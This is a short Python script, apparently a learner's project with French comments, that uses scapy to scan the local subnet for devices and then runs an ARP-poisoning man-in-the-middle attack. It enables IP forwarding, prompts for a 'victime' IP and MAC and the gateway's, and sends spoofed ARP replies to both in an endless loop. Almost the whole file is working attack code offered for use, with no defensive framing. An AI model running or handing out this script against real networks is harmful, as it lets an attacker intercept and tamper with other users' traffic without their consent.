from scapy.all import *
from scapy.all import ARP, Ether

network_adresse = get_if_addr(conf.iface).split('.')
network_adresse = network_adresse[0] + "." + network_adresse[1] + "." + network_adresse[2] + ".0/24"

victimes = [] # tableau des appareils presents

packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_adresse) # Cree les paquets

for sent, received in srp(packet, timeout=3, verbose=0)[0]:
    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
# Ajoute les infos de chaque nouvel appareil trouve dans le tableau

print("\n" + "Available devices in the network :" + "\n")
for victime in victimes:
    print(victime['ip'])
    print(victime['mac'] + "\n")

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') # active l'ip forwarding
VictimeIP = input("Please enter the victime IP : ")
VictimeMac = input("Please enter the victime MAC : ")
GatewayIP = input("Please enter the gateway IP : ")
GatewayMac = input("Please enter the gateway MAC : ")

def poison(VictimeIP, VictimeMac, GatewayIP, GatewayMac):
    send(ARP(op = 2, pdst = VictimeIP, psrc = GatewayIP, hwdst= VictimeMac))
    send(ARP(op = 2, pdst = GatewayIP, psrc = VictimeIP, hwdst= GatewayMac))

while True:
    poison(VictimeIP, VictimeMac, GatewayIP, GatewayMac)